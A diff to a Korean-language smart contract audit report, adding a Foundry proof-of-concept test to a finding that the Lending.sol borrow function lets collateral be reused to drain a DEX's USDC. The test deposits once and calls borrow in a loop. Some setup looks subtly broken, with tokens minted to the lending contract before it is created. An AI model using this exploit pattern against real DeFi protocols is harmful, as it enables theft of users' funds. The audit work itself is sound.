@@ -120,3 +120,47 @@ Lending.sol / borrow
 dex의 모든 usdc를 빼낼 수 있기 때문에 Critical이다.
 ### 해결 방안
 대출을 해주었을 때 담보금에 대한 체크를 하는 체크 루틴을 따로 추가하여 담보금이 재사용되는 것을 방지해야 한다. aave 같은 경우 이를 막기 위해서 debt 토큰을 따로 만들고 관리하여 debt 토큰의 발행량으로 이를 체크한다.
+``` pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "../src/ERC20.sol";
+import "../src/Lending.sol";
+import "../src/DreamOracle.sol";
+
+contract MintableToken is ERC20 {
+    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
+
+    }
+
+    function mint(address receiver, uint256 value) public {
+        super._mint(receiver, value);
+    }
+}
+
+contract lending is Test {
+    Lending lending;
+    MintableToken ETHER;
+    MintableToken USDOLLAR;
+    DreamOracle oracle;
+
+    function setUp() public {
+        ETHER = new MintableToken("ETHER", "ETH");
+        USDOLLAR = new MintableToken("USDOLLAR", "USDC");
+        oracle = new DreamOracle();
+        oracle.setPrice(address(USDOLLAR), 1000 ether);
+        oracle.setPrice(address(ETHER), 1 ether);
+        ETHER.mint(address(this), 500 ether);
+        USDOLLAR.mint(address(this), 500 ether);
+        USDOLLAR.mint(address(lending), 10000000000000000000000000 ether);
+        lending = new Lending(address(ETHER), address(USDOLLAR), address(oracle));            
+    }
+
+    function testSimpleDeposit() public {
+        lending.deposit(address(ETHER), 100 ether);
+        for(uint i=0; i<1000; i++)
+        {
+            lending.borrow(address(ETHER), 1);
+        }
+        USDOLLAR.balanceOf(address(this));
+    }
+}```
